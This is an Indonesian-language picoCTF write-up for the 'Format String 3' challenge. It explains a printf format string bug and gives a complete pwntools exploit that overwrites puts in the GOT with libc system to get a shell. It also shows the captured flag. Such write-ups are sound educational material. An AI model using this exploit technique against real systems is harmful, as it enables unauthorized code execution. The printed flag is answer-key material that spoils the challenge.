### Format String 3 Writeup

Diberikan biner, kode sumber, libc, dan interpreter.

Kode sumber adalah sebagai berikut:

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
    puts("Howdy gamers!");
    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
    char *all_strings[MAX_STRINGS] = {NULL};
    char buf[1024] = {'\0'};

    setup();
    hello();    

    fgets(buf, 1024, stdin);    
    printf(buf);

    puts(normal_string);

    return 0;
}
```

Karena `printf(buf)` digunakan, ini bisa dieksploitasi menggunakan Format String Bug (FSB).

Selain itu, karena `puts(normal_string)` (dengan `normal_string` berisi "/bin/sh") dieksekusi, jika kita mengganti alamat `puts` di GOT dengan alamat fungsi `system`, maka kita bisa mendapatkan shell dan mengambil flag.

Untuk itu, kita membutuhkan 3 informasi:
1. Offset saat `printf` dieksekusi
2. Alamat `puts` di GOT
3. Alamat fungsi `system` di libc

Offset saat `printf` dieksekusi dapat ditemukan dengan memasukkan `%n$p` ke dalam program, yang menunjukkan bahwa offsetnya adalah 38:

```
$ nc rhea.picoctf.net 49961
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f58edbd73f0
%38$p
0xa7024383325
/bin/sh
```

Alamat `puts` di GOT dapat ditemukan menggunakan gdb, yang menunjukkan 0x401080:

```
(gdb) p puts
$1 = {<text variable, no debug info>} 0x401080 <puts@plt>
```

Alamat fungsi `system` di libc bisa berubah setiap kali, jadi kita harus menghitung perbedaannya dengan `setvbuf` di libc, lalu menambahkannya ke alamat `setvbuf` yang diberikan oleh instance.

Ini bisa diimplementasikan menggunakan pwntools sebagai berikut:

```python
import sys
from pwn import *
from pwnlib.elf.elf import *
from pwnlib.fmtstr import *

context.arch='amd64'

fs3 = ELF('./format-string-3')
got_puts = fs3.got['puts']
print(f'got_puts: {hex(got_puts)}')
libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
print(f'libc_system: {hex(libc_system)}')
libc_setvbuf = libc.symbols['setvbuf']
print(f'libc_setvbuf: {hex(libc_setvbuf)}')

host = sys.argv[1]
port = int(sys.argv[2])
r = remote(host, port)
m = r.recvregex(b'libc: 0x([0-9a-f]+)\n', capture=True)
matched_string = m.group(0).decode()
log.info(f'matched_string: {matched_string}')
loaded_libc_setvbuf = int(m.group(1).decode(), 16)
loaded_libc_system = loaded_libc_setvbuf + (libc_system - libc_setvbuf)
log.info(f'loaded_libc_system: {hex(loaded_libc_system)}')
loaded_libc_system_lower = loaded_libc_system & 0xffffffff
format_string = fmtstr_payload(38, {got_puts:loaded_libc_system}, numbwritten=0, write_size='byte')
r.sendline(format_string)
r.interactive()
```

Saat dijalankan, script ini mengirimkan payload ke instance dan mengaktifkan shell:

```
$ python flag.py rhea.picoctf.net 49961
...
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_cf6cb591}
```